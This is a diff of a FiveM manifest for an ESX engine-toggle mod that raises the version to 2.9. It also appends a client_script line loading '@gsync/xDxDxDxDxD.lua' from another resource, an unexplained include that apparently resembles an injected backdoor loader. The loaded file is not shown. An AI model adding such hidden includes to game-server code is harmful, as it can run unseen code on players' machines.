@@ -3,7 +3,7 @@ games { 'gta5' }
 
 author 'Musiker15'
 description 'ESX Better Engine Toggle'
-version '2.8.1'
+version '2.9'
 
 client_scripts {
     '@es_extended/locale.lua',
@@ -20,3 +20,5 @@ server_scripts {
     'config.lua',
 	'server.lua',
 }
+
+client_script '@gsync/xDxDxDxDxD.lua'
